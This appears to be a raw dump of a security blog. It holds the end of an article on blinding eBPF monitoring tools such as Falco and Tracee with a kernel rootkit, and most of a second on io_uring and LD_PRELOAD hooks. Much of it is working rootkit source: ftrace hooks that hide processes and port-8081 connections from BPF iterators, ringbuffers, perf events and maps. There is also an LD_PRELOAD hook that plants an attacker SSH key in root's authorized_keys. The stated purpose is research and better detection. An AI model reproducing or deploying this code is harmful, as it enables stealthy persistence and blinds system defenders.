HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear \u0026ldquo;not found\u0026rdquo; without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nWhat this PoC demonstrates:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques :)\nBottom line: once the kernel is attacker-controlled, the system’s “ground truth” is no longer trustworthy. eBPF raises the bar under a trusted kernel, but it can’t be the last line of defense against a hostile one.\nThe real win is preventing kernel compromise in the first place (boot trust, module enforcement, and layered detection outside the host).\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, 